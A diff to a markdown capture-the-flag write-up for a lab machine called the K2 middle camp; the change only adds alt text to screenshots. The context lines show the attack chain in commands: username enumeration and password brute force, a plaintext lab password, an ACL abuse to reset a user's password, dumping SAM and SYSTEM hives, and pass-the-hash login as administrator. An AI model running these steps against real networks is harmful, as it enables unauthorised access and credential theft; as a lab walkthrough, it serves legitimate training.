@@ -32,8 +32,8 @@ I performed an **nmap** aggressive scan on the target to find open ports and the
 nmap -A -p- TARGET --min-rate 10000 -oN middle.nmap
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/1.webp)
-![](https://cdn.ziomsec.com/k2-middlecamp/2.webp)
+![performing an nmap scan on middle camp](https://cdn.ziomsec.com/k2-middlecamp/1.webp)
+![performing an nmap scan on middle camp](https://cdn.ziomsec.com/k2-middlecamp/2.webp)
 
 I updated my host file with the domains : `k2.thm`, `k2server.k2.thm`
 
@@ -46,7 +46,7 @@ From the **base camp**, I had recovered full names of 2 users, I used the **user
 ./username-anarchy -i fullnames > ../userlist2
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/3.webp)
+![creating a username list](https://cdn.ziomsec.com/k2-middlecamp/3.webp)
 
 After creating a user list, I used **kerbrute** to bruteforce valid usernames.
 - https://github.com/ropnop/kerbrute
@@ -55,11 +55,11 @@ After creating a user list, I used **kerbrute** to bruteforce valid usernames.
 ./kerbrute userenum -d k2.thm --dc TARGET userlist2
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/4.webp)
+![bruteforcing valid users](https://cdn.ziomsec.com/k2-middlecamp/4.webp)
 
 I added these usernames to a list. I then used the user list and the passwords recovered from the **base camp** to bruteforce valid credentials using **netexec**.
 
-![](https://cdn.ziomsec.com/k2-middlecamp/5.webp)
+![creating the username list](https://cdn.ziomsec.com/k2-middlecamp/5.webp)
 
 I found the password for *r.bud* user.
 
@@ -67,7 +67,7 @@ I found the password for *r.bud* user.
 netexec smb TARGET -u userlist2 -p creds/passlist1 --continue-on-success
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/6.webp)
+![brute forcing user credentials](https://cdn.ziomsec.com/k2-middlecamp/6.webp)
 
 I then enumerated other users on the machine.
 
@@ -75,7 +75,7 @@ I then enumerated other users on the machine.
 netexec smb TARGET -u "r.bud" -p password --users
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/7.webp)
+![enumerating other users](https://cdn.ziomsec.com/k2-middlecamp/7.webp)
 
 I then verified if *r.bud* had the permissions to access the server using **winrm** or **rdp** and connected to the target using **evil-winrm**
 
@@ -83,11 +83,11 @@ I then verified if *r.bud* had the permissions to access the server using **winr
 evil-winrm -i TARGET -u "r.bud" -p "vRMkaVgdfxhW!8"
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/8.webp)
+![gaining rdp access](https://cdn.ziomsec.com/k2-middlecamp/8.webp)
 
 I found some notes in the *Documents* directory.
 
-![](https://cdn.ziomsec.com/k2-middlecamp/9.webp)
+![viewing notes](https://cdn.ziomsec.com/k2-middlecamp/9.webp)
 
 Based on the message, I could brute force the password of *james* (`j.bold`) by creating a custom wordlist. I used **crunch** to create a wordlist with "`rockyou`" and 1 special character and 1 number.
 
@@ -105,7 +105,7 @@ I then used the custom wordlist to bruteforce the password for *j.bold* user.
 ./kerbrute bruteuser --dc TARGET -d k2.thm passlist 'j.bold'
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/10.webp)
+![bruteforcing user credential](https://cdn.ziomsec.com/k2-middlecamp/10.webp)
 
 I then used **bloodhound** for a comprehensive enumeration and to visualize the domain information.
 
@@ -113,11 +113,11 @@ I then used **bloodhound** for a comprehensive enumeration and to visualize the 
 bloodhound-python -d 'k2.thm' -u 'r.bud' -p 'vRMkaVgdfxhW!8' -c all -ns TARGET --zip
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/11.webp)
+![enumerating the target domain](https://cdn.ziomsec.com/k2-middlecamp/11.webp)
 
 I found something interesting. Our user *j.bold* had **GenericAll** permission over *j.smith* user.
 
-![](https://cdn.ziomsec.com/k2-middlecamp/12.webp)
+![viewing misconfigured ACL](https://cdn.ziomsec.com/k2-middlecamp/12.webp)
 
 I then used **bloodyAD** to set a new password for *j.smith*.
 - https://github.com/CravateRouge/bloodyAD
@@ -129,7 +129,7 @@ netexec smb TARGET -u 'j.smith' -p "password@123"
 netexec winrm TARGET -u 'j.smith' -p "password@123"
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/13.webp)
+![changing the target's password](https://cdn.ziomsec.com/k2-middlecamp/13.webp)
 
 I then accessed the target as *j.smith*.
 
@@ -137,7 +137,7 @@ I then accessed the target as *j.smith*.
 evil-winrm -i TARGET -u 'j.smith' -p 'password@123'
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/14.webp)
+![accessing the machine](https://cdn.ziomsec.com/k2-middlecamp/14.webp)
 
 I found the user flag from *Desktop*.
 
@@ -145,7 +145,7 @@ I found the user flag from *Desktop*.
 cat C:\Users\j.smith\Desktop\user.txt
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/15.webp)
+![capturing the user flag](https://cdn.ziomsec.com/k2-middlecamp/15.webp)
 
 ## Privilege Escalation
 
@@ -159,7 +159,7 @@ download system.bak
 download sam.bak
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/16.webp)
+![enumerating local privs and copy credential hives](https://cdn.ziomsec.com/k2-middlecamp/16.webp)
 
 I then used **impacket-secretsdump** to dump the contents and got the *administrator* NTLM hash.
 
@@ -167,7 +167,7 @@ I then used **impacket-secretsdump** to dump the contents and got the *administr
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/17.webp)
+![dumping hashes from the hives](https://cdn.ziomsec.com/k2-middlecamp/17.webp)
 
 I then used the hash to access the target as *administrator*.
 
@@ -175,7 +175,7 @@ I then used the hash to access the target as *administrator*.
 evil-winrm -i TARGET -u "administrator" -H "HASH"
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/18.webp)
+![accessing the target as administrator](https://cdn.ziomsec.com/k2-middlecamp/18.webp)
 
 Finally, I captured the root flag from *administrator*'s *Desktop*.
 
@@ -183,7 +183,7 @@ Finally, I captured the root flag from *administrator*'s *Desktop*.
 cat C:\Users\Administrator\Desktop\root.txt
 ```
 
-![](https://cdn.ziomsec.com/k2-middlecamp/19.webp)
+![capturing the root flag](https://cdn.ziomsec.com/k2-middlecamp/19.webp)
 
 With this, I pwned the middle camp as well. So, I finally move on to the summit.
 
